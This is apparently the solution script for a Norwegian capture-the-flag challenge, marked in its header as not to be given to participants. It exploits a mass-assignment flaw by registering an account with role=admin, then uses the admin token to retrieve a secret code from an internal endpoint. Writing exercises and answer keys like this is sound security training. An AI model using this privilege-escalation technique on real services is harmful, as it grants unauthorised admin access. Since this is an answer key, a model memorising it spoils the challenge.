"""
LØSNING (ikke gi til deltakerne!)

Mass-assignment i /api/v1/register lar klienten sette role=admin.
"""

from __future__ import annotations

import random
import string
import sys

import requests


def main() -> int:
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    username = f"solver_{suffix}"
    password = f"pass_{suffix}"

    registration = {
        "username": username,
        "password": password,
        "company": "Solver AS",
        "role": "admin",
    }
    r = requests.post(f"{base}/api/v1/register", json=registration, timeout=10)
    r.raise_for_status()

    r = requests.post(
        f"{base}/api/v1/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    r.raise_for_status()
    token = r.json()["token"]

    r = requests.get(
        f"{base}/api/v1/internal/beredskap",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    r.raise_for_status()
    print(r.json()["beredskapskode"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
